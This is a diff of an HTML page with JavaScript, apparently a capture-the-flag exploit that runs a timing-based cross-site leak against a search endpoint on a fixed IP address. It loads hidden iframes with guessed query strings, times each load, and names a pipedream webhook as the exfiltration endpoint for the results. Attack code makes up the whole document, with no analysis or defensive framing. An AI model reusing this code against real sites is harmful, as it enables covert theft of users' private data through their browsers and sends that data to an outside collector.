@@ -5,19 +5,18 @@
             function runTest(param) {
                 // Wait for the iframe to load (~500ms)
                 setTimeout(() => {
-
                     // URL to load for the flag
-                    var url_to_load = 'http://125.138.133.213:44444/search?query=S';
+                    var url_to_load = 'http://125.138.133.213:44444/search?query=' + param;
 
                     // Webhook URL to report (exfiltration)
                     var wh_url = 'https://eo92jpwn05w7j5i.m.pipedream.net';
 
                     var start = window.performance.now();
 
-                    // Create an iframe element for the YANA page
+                    // Create an iframe element for the search query page
                     var iframe = document.createElement('iframe');
                     iframe.style.display = 'none'; // Hide the iframe
-                    iframe.src = url_to_load; // Set the src to the YANA.html#flag URL
+                    iframe.src = url_to_load; // Set the src to the search page
                     document.body.appendChild(iframe);
 
                     // Listen for the iframe load event
@@ -34,20 +33,17 @@
                 }, 500);
             }
 
-            
-
-        </script>
-    </head>
-    <body>
-        <!-- Run the test function with the "no flag" string -->
-        <script>
-           // Add an image element for the 1.jpg image
+            // Create and append the image element for the 1.jpg image
             var img = document.createElement('img');
             img.style.display = 'none';  // Hide the image
             img.src = 'http://125.138.133.213:44444/static/images/1.jpg';  // Image URL
             document.body.appendChild(img);  // Append the image to the body
-          
+
+            // Run the test function with the desired query string
             runTest("S");
         </script>
+    </head>
+    <body>
+        <!-- The page content here -->
     </body>
 </html>
